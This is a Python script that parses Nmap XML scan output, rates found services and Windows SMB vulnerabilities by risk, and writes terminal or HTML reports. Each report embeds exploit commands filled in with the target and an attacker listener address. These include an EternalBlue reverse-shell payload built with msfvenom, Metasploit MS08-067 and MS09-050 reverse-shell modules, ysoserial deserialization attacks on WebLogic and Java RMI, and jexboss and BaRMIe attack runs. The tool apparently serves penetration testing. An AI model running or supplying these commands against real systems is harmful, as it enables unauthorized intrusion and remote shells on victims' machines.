#!/usr/bin/env python3

"""
Credits:
    - Markdown CSS: https://github.com/sindresorhus/github-markdown-css
    - Markdown to HTML: https://penandpants.com/2013/02/22/a-styled-html-document-from-markdown/
"""

# TODO: Parse Java-RMI
# TODO: Generate report hosts per vuln 
# TODO: store exploits in an external file 

import os
import sys
import re
import argparse
import markdown
import jinja2
from bs4 import BeautifulSoup

RED_BOLD    = "\033[31;1m"
YELLOW_BOLD = "\033[33;1m"
BLUE_BOLD   = "\033[34;1m"
CYAN_BOLD   = "\033[36;1m"
GREEN       = "\033[32m"
GREEN_BOLD  = "\033[32;1m"
RESET       = "\033[0;0m"
BOLD        = "\033[;1m"
REVERSE     = "\033[;7m"

RISK_UNK    = 0
RISK_LOW    = 1 
RISK_MEDIUM = 2
RISK_HIGH   = 3

OUT_TERM    = 1
OUT_MD      = 2

g_lhost = "10.10.13.37"
g_lport = "1337"

class Host:
    def __init__(self, ip, hostname="", osname="", osname_accur=0):
        self.ip = ip
        self.hostname = hostname
        self.osname = osname 
        self.osname_accur = osname_accur
        self.findings = []
        self.vulns = []
    
    def __str__(self):
        ret = ""
        ret += "HOST: %s - Findinds: %d | Vulns: %d" % (self.ip, len(self.findings), len(self.vulns))
        return ret
    
    def osguess(self, oslist):
        accuracy = 0
        osname = ""
        if oslist != None:
            oss = oslist.find_all("osmatch")
            for o in oss:
                accur = int(o["accuracy"])
                if accur > accuracy:
                    accuracy = accur
                    osname = o["name"]
            self.osname = osname
            self.osname_accur = accuracy

    def parseportscan(self, ports):
        if ports != None:
            for port in ports.find_all("port"):
                portnum = int(port["portid"]) # e.g.: 1099
                proto = port["protocol"] # e.g: tcp 
                state = port.state["state"] # e.g.: open 
                if port.service != None:
                    service = port.service["name"] # e.g.: java-rmi 
                    product = ""
                    if "product" in port.service.attrs:
                        product = port.service["product"] # e.g.: Java RMI
                    hostname = ""
                    if "hostname" in port.service.attrs:
                        self.hostname = port.service["hostname"]
                    
                    if state == "open":
                        if service == "ftp":
                            scripts = port.find_all("script")
                            for script in scripts:
                                if script["id"] == "ftp-anon":
                                    if "Anonymous FTP login allowed" in script["output"]:
                                        finding = Finding(proto, portnum, service, RISK_LOW, script["output"].split('\n')[0])
                                        finding.seturl(self.ip)
                                        self.findings.append(finding)
                        elif service == "http" or service == "https":
                            if "JBoss" in product:
                                finding = Finding(proto, portnum, service, RISK_LOW, product)
                                finding.seturl(self.ip)
                                self.findings.append(finding)
                            scripts = port.find_all("script")
                            for script in scripts:
                                if script["id"] == "weblogic-t3-info":
                                    if "T3 protocol in use" in script["output"]:
                                        finding = Finding(proto, portnum, service, RISK_HIGH, script["output"])
                                        finding.seturl(self.ip)
                                        self.findings.append(finding)
                                elif script["id"] == "http-server-header":
                                    if "Apache Tomcat" in product and "Apache-Coyote" in script["output"]:
                                        finding = Finding(proto, portnum, service, RISK_LOW, product)
                                        finding.seturl(self.ip)
                                        self.findings.append(finding)
                        elif service == "ms-sql-s" or service == "ms-sql":
                            self.findings.append(Finding(proto, portnum, service, RISK_LOW, "%s - Version %s" % (port.service["product"], port.service["version"])))
                        elif service == "ms-wbt-server": # RDP / TSE
                            scripts = port.find_all("script")
                            for script in scripts:
                                if script["id"] == "rdp-vuln-ms12-020":
                                    self.parsescriptscan(port)
                        elif service == "java-rmi" or service == "rmiregistry":
                            # TODO: Parse only vulnerable endpoints
                            if product == "Java RMI":
                                self.findings.append(Finding(proto, portnum, service, RISK_LOW, "%s (%s)" % (product, service)))

    def parsescriptscan(self, hostscript):
        if hostscript != None:
            for script in hostscript:
                if script.table != None:
                    key = script.table["key"]
                    elems = script.table.find_all("elem")
                    for e in elems:
                        if "key" in e.attrs:
                            if e["key"] == "title":
                                title = e.get_text()
                            elif e["key"] == "state":
                                state = e.get_text()
                    if script["id"] == "smb-vuln-regsvc-dos":
                        pass
                    else:
                        ms_code, risk_level = helper_cve_to_mscode(key)
                        self.vulns.append(Vulnerability(key, state, title, risk=risk_level, mscode=ms_code))

class Finding:
    def __init__(self, protocol, port, service, risk, description):
        self.protocol = protocol
        self.port = port
        self.service = service
        self.risk = risk
        self.description = description
        self.url = ""
    
    def seturl(self, ip):
        self.url = "%s://%s:%s/" % (self.service, ip, self.port)
    
    def outterm(self):
        out = ""
        out += risktostr(self.risk, mode=OUT_TERM)
        out += "[%s%s%s]" % (BOLD, self.service.upper(), RESET)
        out += " %s/%s" % (self.protocol, self.port)
        out += " - %s" % (self.description)
        return out
    
    def outmarkdown(self, host):
        out = ""
        out += "### %s\n" % (self.description)
        out += "__Risk:__ %s  \n" % (risktostr(self.risk, mode=OUT_MD))
        out += "__Service:__ %s (%s/%s)  \n" % (self.service.upper(), self.protocol, self.port)
        if self.url != "":
            out += "__URL:__ [%s](%s)  \n" % (self.url, self.url)
        exploits = self.getexploits(host)
        for i in range(len(exploits)):
            out += "#### Exploit %d\n" % (i + 1)
            out += "%s  \n" % (exploits[i])
        return out 
        
    def getexploits(self, host):
        exploits = []
        if "T3 protocol in use" in self.description:
            exp = """```bash
# https://github.com/Coalfire-Research/java-deserialization-exploits
python weblogic.py --ysoserial-path ../ysoserial.jar %s:%s "ping -%s 4 %s"
tcpdump -vvv -i eth0 icmp # Check incoming ICMP request
```""" % (host.ip, self.port, "n" if "windows" in host.osname.lower() else "c", g_lhost)
            exploits.append(exp)
            exp = """```
# Check whether 'Oracle WebLogic WSAT' is available 
curl %s://%s:%s/wls-wsat/CoordinatorPortType
```""" % (self.service, host.ip, self.port)
            exploits.append(exp)
        elif "Apache Tomcat" in self.description:
            exp = """```
# Check admin URLs for default credentials:
%s/manager
%s/host-manager
%s/admin
# Test default credentials with Metasploit:
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS %s
set RPORT %s
run
```""" % (self.url,self.url,self.url, host.ip, self.port)
            exploits.append(exp)
        elif "Anonymous FTP login" in self.description:
            exp = """```bash
ftp %s %s
```""" % (host.ip, self.port)
            exploits.append(exp)
        elif "JBoss" in self.description:
            exp = """```bash
# https://github.com/joaomatosf/jexboss
python jexboss.py -u %s -r %s:%s
```""" % (self.url, g_lhost, g_lport)
            exploits.append(exp)
        elif "rmiregistry" == self.service:
            exp = """```bash
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit %s %s CommonsCollections1 "ping -%s 4 %s"
tcpdump -vvv -i eth0 icmp # Chec incoming ICMP requests
```""" % (host.ip, self.port, "n" if "windows" in host.osname.lower() else "c", g_lhost) 
            exploits.append(exp)
        elif "java-rmi" == self.service:
            exp = """```bash
# Scan the service
java -jar BaRMIe_v1.01.jar -enum %s %s
# Attack the service 
java -jar BaRMIe_v1.01.jar -attack %s %s
```""" % (host.ip, self.port, host.ip, self.port)
            exploits.append(exp) 
        return exploits
        
class Vulnerability:
    def __init__(self, name, state, description, risk=RISK_HIGH, mscode=""):
        self.name = name
        self.state = state
        self.description = description
        self.risk = risk
        self.mscode = mscode
    
    def outterm(self):
        out = ""
        out += risktostr(self.risk, mode=OUT_TERM)
        if self.mscode != "":
            out += "[%s%s%s]" % (BOLD, self.mscode, RESET)
        else:
            out += "[%s%s%s]" % (BOLD, self.name, RESET)
        out += " Status:"
        out += " %s%s%s" % (BOLD, self.state, RESET)
        out += " - %s" % (self.description)
        return out
    
    def outmarkdown(self, host):
        out = ""
        out += "### %s\n" % (self.description)
        out += "__Risk:__ %s  \n" % (risktostr(self.risk, mode=OUT_MD))
        if self.mscode != "":
            out += "__Vuln ID:__ %s (%s)  \n" % (self.mscode, self.name)
        else:
            out += "%s  \n" % (self.name)
        out += "__Status:__ %s  \n" % (self.state)
        exploits = self.getexploits(host)
        for i in range(len(exploits)):
            out += "#### Exploit %d\n" % (i + 1)
            out += "%s  \n" % (exploits[i])
        return out 
    
    def getexploits(self, host):
        exploits = []
        if self.name == "CVE-2017-0143": # MS17-010
            exp = """```bash
# https://github.com/vivami/MS17-010
cd shellcode
nasm -f bin eternalblue_kshellcode_x64.asm
msfvenom -p windows/x64/shell_reverse_tcp -f raw -o payload.bin EXITFUNC=thread LHOST=%s LPORT=%s
cat eternalblue_kshellcode_x64 payload.bin > reverse_%s_%s_x64.bin
rm payload.bin && cd ..
python eternalblue_exploit7.py %s shellcode/reverse_%s_%s_x64.bin
```""" % (g_lhost, g_lport, g_lhost, g_lport, host.ip, g_lhost, g_lport)
            exploits.append(exp)
        elif self.name == "CVE-2012-0152": # MS12-020
            pass
        elif self.name == "CVE-2009-3103": # MS09-050
            exp = """```
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
set payload windows/shell_reverse_tcp
set RHOSTS %s
set LHOST %s
set LPORT %s
run
```""" % (host.ip, g_lhost, g_lport)
            exploits.append(exp)
        elif self.name == "CVE-2008-4250": # MS08-067
            exp = """```
use exploit/windows/smb/ms08_067_netapi
set payload windows/shell_reverse_tcp
set RHOSTS %s
set LHOST %s
set LPORT %s
run
```""" % (host.ip, g_lhost, g_lport)
            exploits.append(exp)
        return exploits

class Report:
    def __init__(self):
        self.hosts = [] 
    
    def addhost(self, host):
        self.hosts.append(host)
    
    def outterm(self):
        out = ""
        for h in self.hosts:
            out += "%sREPORT FOR HOST %s%s\n" % (BOLD, h.ip, RESET)
            out += "%s[*]%s %sHost info:%s\n" % (BLUE_BOLD, RESET, BOLD, RESET)
            if h.hostname != "":
                out += "    %sHostname:%s %s\n" % (BOLD, RESET, h.hostname)
            if h.osname != "":
                out += "    %sOS:%s %s (Accuracy: %s%s%%%s)\n" % (BOLD, RESET, h.osname, BOLD, h.osname_accur, RESET)
            if len(h.findings) > 0:
                out += "%s[*]%s %sFindings (%d):%s\n" % (BLUE_BOLD, RESET, BOLD, len(h.findings), RESET)
                for finding in h.findings:
                    out += "    %s\n" % (finding.outterm())
            if len(h.vulns) > 0:
                out += "%s[*]%s %sVulnerabilities (%d):%s\n" % (BLUE_BOLD, RESET, BOLD, len(h.vulns), RESET)
                for vuln in h.vulns:
                    out += "    %s\n" % (vuln.outterm())
            out += "\n"
        return out
    
    def outmarkdown(self):
        out = ""
        out += "# Nmap scan result\n"
        for h in self.hosts:
            out += "## %s\n" % (h.ip)
            if h.hostname != "":
                out += "__Hostname:__ %s  \n" % (h.hostname)
            if h.osname != "":
                out += "__OS:__ %s (Accuracy: __%s%%__)  \n" % (h.osname, h.osname_accur)
            if len(h.vulns) > 0:
                for vuln in h.vulns:
                    out += "%s\n" % (vuln.outmarkdown(h))
            if len(h.findings) > 0:
                for finding in h.findings:
                    out += "%s\n" % (finding.outmarkdown(h)) 
        return out
    
    def outhtml(self, outfile):
        out = ""
        script_path = os.path.dirname(os.path.realpath(__file__))
        css_path = os.path.normpath(os.path.join(script_path, "style.css"))
        css = open(css_path, "r").read() 
        extensions = ['extra', 'smarty']
        html = markdown.markdown(self.outmarkdown(), extensions=extensions, output_format='html5')
        template = """<!DOCTYPE html>
<html>
<head>
    <style>
{{css}}

	    .markdown-body {
		    box-sizing: border-box;
		    min-width: 200px;
		    max-width: 980px;
		    margin: 0 auto;
		    padding: 45px;
	    }

	    @media (max-width: 767px) {
		    .markdown-body {
			    padding: 15px;
		    }
	    }
	    
        .label {
            border-radius: 4px;
            color: white;
            padding-left: 6px;
            padding-right: 6px;
        }

        .success {background-color: #4CAF50;} /* Green */
        .info {background-color: #2196F3;} /* Blue */
        .warning {background-color: #ff9800;} /* Orange */
        .danger {background-color: #f44336;} /* Red */
        .other {background-color: #e7e7e7; color: black;} /* Gray */
    </style>
</head>
<body>
<div class="markdown-body">
{{content}}
</div>
</body>
</html>"""
        doc = jinja2.Template(template).render(css=css, content=html)
        
        try:
            f = open(outfile, "w")
            f.write(doc)
            f.close()
        except:
            print("%s[-]%s Unexpected error: '%s'" % (RED_BOLD, RESET, sys.exc_info()[0])) 
            

def risktostr(risk_level, mode=OUT_TERM):
    ret = ""
    if mode == OUT_TERM:
        if risk_level == RISK_LOW:
            ret += "[%s\u25A0  %s]" % (BLUE_BOLD, RESET)
        elif risk_level == RISK_MEDIUM:
            ret += "[%s\u25A0\u25A0 %s]" % (YELLOW_BOLD, RESET)
        elif risk_level == RISK_HIGH:
            ret += "[%s\u25A0\u25A0\u25A0%s]" % (RED_BOLD, RESET)
        elif risk_level == RISK_UNK:
            ret += "[   ]" 
    elif mode == OUT_MD:
        if risk_level == RISK_LOW:
            ret += "<span class='label info'>INFO</span>" 
        elif risk_level == RISK_MEDIUM:
            ret += "<span class='label warning'>MEDIUM</span>" 
        elif risk_level == RISK_HIGH:
            ret += "<span class='label danger'>HIGH</span>" 
        elif risk_level == RISK_UNK:
            ret += "<span class='label other'>UNKNOWN</span>" 
    return ret 

def helper_cve_to_mscode(cve):
    risk_level = RISK_UNK
    ms_code = ""
    if cve == "CVE-2017-0143": # MS17-010
        ms_code = "MS17-010"
        risk_level = RISK_HIGH
    elif cve == "CVE-2012-0152": # MS12-020
        ms_code = "MS12-020"
        risk_level = RISK_MEDIUM
    elif cve == "CVE-2009-3103":
        ms_code = "MS09-050"
        risk_level = RISK_HIGH
    elif cve == "CVE-2008-4250":
        ms_code = "MS08-067"
        risk_level = RISK_HIGH
    return ms_code, risk_level

def main():

    parser = argparse.ArgumentParser(description="Nmap scan result parser")
    parser.add_argument("xml", help="XML file to parse")
    parser.add_argument("-o", action="store_true", help="Generate an HTML report")
    parser.add_argument("--lhost", help="Local IP address (used for reverse connections)", default="10.10.13.37")
    parser.add_argument("--lport", help="Local port (used for reverse connections)", default="4444")
    args = parser.parse_args()
    
    global g_lhost, g_lport
    g_lhost = args.lhost
    g_lport = args.lport
    
    try:
        f = open(args.xml, 'r')
    except FileNotFoundError:
        print("%s[-]%s File not found." % (RED_BOLD, RESET))
        return
    except:
        print("%s[-]%s Unexpected error: '%s'" % (RED_BOLD, RESET, sys.exc_info()[0]))
        return 
    
    fileext = os.path.splitext(args.xml)[1]
    if fileext != ".xml":
        print("%s[!]%s Input file doesn't have the '.xml' extension" % (YELLOW_BOLD, RESET))
    
    fc = f.read()
    soup = BeautifulSoup(fc, "xml")
    
    report = Report()
    hosts = soup.find_all("host")
    for host in hosts:
        
        host_addr = host.address["addr"]
        h = Host(host_addr)
        
        h.osguess(host.os) # Get OS name
        h.parseportscan(host.ports) # Parse ports scan result 
        h.parsescriptscan(host.hostscript) # Parse vulnerabities
        
        # If there is something to report, add host to report 
        if len(h.findings) > 0 or len(h.vulns) > 0:
            report.addhost(h)
    
    if args.o:
        filename = "%s.html" % os.path.splitext(args.xml)[0]
        report.outhtml(filename)  
        print("%s[*]%s Generated report '%s'." % (BLUE_BOLD, RESET, filename))
    else:
        print(report.outterm())

if __name__ == '__main__':
    main()


